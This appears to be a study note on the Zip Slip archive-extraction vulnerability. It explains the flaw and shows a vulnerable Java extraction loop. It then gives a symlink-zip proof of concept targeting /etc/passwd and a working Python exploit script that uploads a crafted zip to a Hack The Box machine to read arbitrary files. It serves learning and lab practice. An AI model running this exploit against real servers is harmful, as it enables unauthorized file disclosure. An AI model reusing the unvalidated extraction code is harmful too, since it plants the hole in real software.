Zip Slip is a widespread critical archive extraction vulnerability, allowing attackers to write arbitrary files on the system, typically resulting in remote command execution. It was discovered and responsibly disclosed by the Synk Security team ahead of a public disclosure on June 5th, 2018, and affects thousands of projects, including ones from HP, Amazon, Apache, Pivotal and many more. 

The vulnerability has been found in multiple ecosystems, including JavaScript, Ruby, .NET and Go, but is especially prevalent in Java, where there is no central library offering high level processing of archive (e.g zip) files. The lack of such a library led to vulnerable code snippets being hand-crafted and shared among developer communities such as StackOverFlow.

The vulnerability is exploited using a specially crafted archive that holds directory traversal filenames (e.g. ../../evil.sh). The Zip Slip vulnerability can affect numerous archive formats, including tar, jar, war, cpio, apk, rar, and 7z.

Here is a vulnerable code example showing a ZipEntry path being concatenated to a destination directory without any path validation. Code similar to this has been found in many repositories across many ecosystems, including libraries which thousands of applications depend on. 

```
	Enumeration<ZipEntry> entries = zip.getEntries();
	while (entries.hasMoreElements()) { 
		ZipEntry e= entries.nextElement();
		File f = new File(destinationDir, e.getName());
		InputStream input = zip.getInputStream(e);
		IOUtils.copy(input, write(f));
		}
```

POC:
```
┌──(ani㉿neo)-[~/HTB/Zipping]
└─$ ln -rs /etc/passwd 1.pdf

┌──(ani㉿neo)-[~/HTB/Zipping]
└─$ zip --symlinks poc.zip ./1.pdf
  adding: upload.pdf (stored 0%)

┌──(ani㉿neo)-[~/HTB/Zipping]
└─$ unzip -l poc.zip
Archive:  poc.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       35  2023-11-13 13:24   1.pdf
---------                     -------
       35                     1 file

```


LFI using ZipSlip: (HTB Box Zipping):
```
import os
from bs4 import BeautifulSoup
import requests
import shutil
import asyncio

async def makefile(file_to_read):
        if os.path.exists("tmp"):
                shutil.rmtree("tmp")
        if os.path.exists("sym.zip"):
                os.remove("sym.zip")
        if os.path.exists("symlink.pdf"):
                os.remove("symlink.pdf")
        if not os.path.exists("tmp"):
                os.mkdir("tmp")
        print("Creating symlink...")
        os.chdir("tmp/")
        os.system(f"ln -s {file_to_read} symlink.pdf")
        print("Zipping")
        os.system(f"zip -r --symlinks sym.zip symlink.pdf")
        print("Done! Zip file: sym.zip")

        print("Uploading file...")
        MIP = "10.10.11.229"
        file = {'zipFile': ('sym.zip', open('sym.zip','rb'), 'application/zip'),
                'submit': (None, '')
                }
        await upload(file, MIP)

async def upload(file, MIP):
        headers = {"Host":MIP,"User-Agent":"Mozilla/5.0 (X11;Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"}
        s = requests.Session()
        r = s.get(f"http://{MIP}",headers=headers)
        r = s.get(f"http://{MIP}/upload.php", headers=headers)
        r = s.post(f"http://{MIP}/upload.php", files=file, headers=headers)

        soup = BeautifulSoup(r.text,features="lxml")
        uuid=""

        for a in soup.find_all("a",href=True):
                if "uploads" in a['href']:
                        uuid = a['href'].split("/")[1]
                        print("File UUID: ",uuid)
                        print("\nReading File...")
                        r = s.get(f"http://{MIP}/uploads/{uuid}/symlink.pdf")
                        print(r.text)

async def main():
        file_to_read = input("File to read: ")
        await makefile(file_to_read)

asyncio.run(main())
```

Sources:
https://github.com/snyk/zip-slip-vulnerability
https://infosecwriteups.com/zip-slip-vulnerability-064d46ca42e5